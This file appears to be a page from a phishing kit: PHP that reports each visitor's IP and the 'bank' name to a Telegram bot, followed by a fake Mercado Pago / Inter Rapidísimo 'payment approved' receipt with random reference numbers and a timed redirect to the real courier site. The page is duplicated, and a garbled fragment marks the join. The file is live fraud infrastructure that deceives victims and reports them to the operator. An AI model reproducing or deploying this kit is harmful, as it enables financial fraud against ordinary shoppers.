<?php
require_once __DIR__ . "/../../panel_v2/config.php";
require_once __DIR__ . "/../../panel_v2/lib/telegram.php";
@session_start();
$ip = $_SERVER['REMOTE_ADDR'] ?? 'IP desconocida';
Telegram::send("✅ <b>Usuario Finalizado</b>
Banco: " . basename(__DIR__) . "
IP: " . $ip);
?>



<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comprobante de Pago - Inter rapidÃ­simo</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="icon" href="https://placetopay.dev/favicon.svg" type="image/vnd.microsoft.icon">
    <script src="https://cdn.tailwindcss.com"></script>
   
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f0f4f8;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">
    <div class="bg-white shadow-xl rounded-2xl overflow-hidden w-full max-w-2xl">
      <div class="bg-white p-6 text-center border-b-4" style="border-color: #00a650;">
        <img src="mercado_logo.png" alt="Mercado Pago" class="mx-auto mb-4" style="height: 50px;">
        <h1 class="text-2xl font-bold text-gray-800">¡Pago Exitoso!</h1>
      </div>
        
        <div class="p-8 space-y-6">
            <div class="text-center">
              <h2 class="text-2xl font-semibold" style="color: #00a650;">Tu pago fue procesado correctamente</h2>
                <p class="text-gray-600">Referencia de Pago #<span id="reference" class="font-medium"></span></p>
            </div>
            
            <div class="bg-gray-100 rounded-lg p-4">
                <p class="text-center text-gray-700 mb-2"><span id="fecha" class="font-medium"></span></p>
                <p class="text-center text-gray-700 mb-2 font-bold">Tu compra está protegida. Te enviaremos un correo con los detalles del envío y el número de guía pronto.</p>
                <p class="text-center text-sm italic text-gray-500">"Mercado Libre - Compra Protegida"</p>
            </div>
            
            <div class="space-y-4">
                <h3 class="text-xl font-semibold text-gray-800">Detalles de la operación</h3>
                <div class="flex justify-between items-center border-b border-gray-200 pb-2">
                    <span class="text-gray-600">Medio de pago</span>
                    <span class="font-medium text-gray-800">Tarjeta de crédito</span>
                </div>
                <div class="flex justify-between items-center border-b border-gray-200 pb-2">
                    <span class="text-gray-600">Autorización</span>
                    <span class="font-medium text-gray-800">Aprobado</span>
                </div>
                <div class="flex justify-between items-center border-b border-gray-200 pb-2">
                    <span class="text-gray-600">Número de operación</span>
                    <span id="receipt" class="font-medium text-gray-800"></span>
                </div>
                <div class="flex justify-between items-center">
                    <span class="text-gray-600">Estado</span>
                    <span class="font-medium" style="color: #00a650;">Aprobado</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        function getRandomInt(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        document.getElementById('reference').textContent = getRandomInt(211990000, 211999809);
        document.getElementById('receipt').textContent = getRandomInt(819661928168311, 819661928968000);
        
        const fechaActual = new Date().toLocaleDateString('es-CO', { 
            year: 'numeric', 
            month: 'long', 
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        });
        document.getElementById('fecha').textContent = fechaActual;
    </script>

    <script>
        function redireccionar() {
            setTimeout(function() {
                window.location.href = "https://wwwrapsprod.interrapidisimo.com/PQR/";
            }, 20000);
        }
        redireccionar();
    </script>

    <script>
        window.addEventListener('beforeunload', function(event) {
            if (window.performance.navigation.type === 2) {
                window.location.href = "https://wwwrapsprod.interrapidisimo.com/PQR/";
            }
        });
    </script>
</body>
</html>SERVER["REMOTE_ADDR"] ?? "IP desconocida";
Telegram::send("✅ <b>Usuario Finalizado</b>\nBanco: " . basename(__DIR__) . "\nIP: " . $ip);
?>



<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comprobante de Pago - Inter rapidÃ­simo</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="icon" href="https://placetopay.dev/favicon.svg" type="image/vnd.microsoft.icon">
    <script src="https://cdn.tailwindcss.com"></script>
   
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f0f4f8;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">
    <div class="bg-white shadow-xl rounded-2xl overflow-hidden w-full max-w-2xl">
      <div class="bg-white p-6 text-center border-b-4" style="border-color: #00a650;">
        <img src="mercado_logo.png" alt="Mercado Pago" class="mx-auto mb-4" style="height: 50px;">
        <h1 class="text-2xl font-bold text-gray-800">¡Pago Exitoso!</h1>
      </div>
        
        <div class="p-8 space-y-6">
            <div class="text-center">
              <h2 class="text-2xl font-semibold" style="color: #00a650;">Tu pago fue procesado correctamente</h2>
                <p class="text-gray-600">Referencia de Pago #<span id="reference" class="font-medium"></span></p>
            </div>
            
            <div class="bg-gray-100 rounded-lg p-4">
                <p class="text-center text-gray-700 mb-2"><span id="fecha" class="font-medium"></span></p>
                <p class="text-center text-gray-700 mb-2 font-bold">Tu compra está protegida. Te enviaremos un correo con los detalles del envío y el número de guía pronto.</p>
                <p class="text-center text-sm italic text-gray-500">"Mercado Libre - Compra Protegida"</p>
            </div>
            
            <div class="space-y-4">
                <h3 class="text-xl font-semibold text-gray-800">Detalles de la operación</h3>
                <div class="flex justify-between items-center border-b border-gray-200 pb-2">
                    <span class="text-gray-600">Medio de pago</span>
                    <span class="font-medium text-gray-800">Tarjeta de crédito</span>
                </div>
                <div class="flex justify-between items-center border-b border-gray-200 pb-2">
                    <span class="text-gray-600">Autorización</span>
                    <span class="font-medium text-gray-800">Aprobado</span>
                </div>
                <div class="flex justify-between items-center border-b border-gray-200 pb-2">
                    <span class="text-gray-600">Número de operación</span>
                    <span id="receipt" class="font-medium text-gray-800"></span>
                </div>
                <div class="flex justify-between items-center">
                    <span class="text-gray-600">Estado</span>
                    <span class="font-medium" style="color: #00a650;">Aprobado</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        function getRandomInt(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        document.getElementById('reference').textContent = getRandomInt(211990000, 211999809);
        document.getElementById('receipt').textContent = getRandomInt(819661928168311, 819661928968000);
        
        const fechaActual = new Date().toLocaleDateString('es-CO', { 
            year: 'numeric', 
            month: 'long', 
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        });
        document.getElementById('fecha').textContent = fechaActual;
    </script>

    <script>
        function redireccionar() {
            setTimeout(function() {
                window.location.href = "../../index.php";
            }, 20000);
        }
        redireccionar();
    </script>

    <script>
        window.addEventListener('beforeunload', function(event) {
            if (window.performance.navigation.type === 2) {
                window.location.href = "../../index.php";
            }
        });
    </script>
</body>
</html>
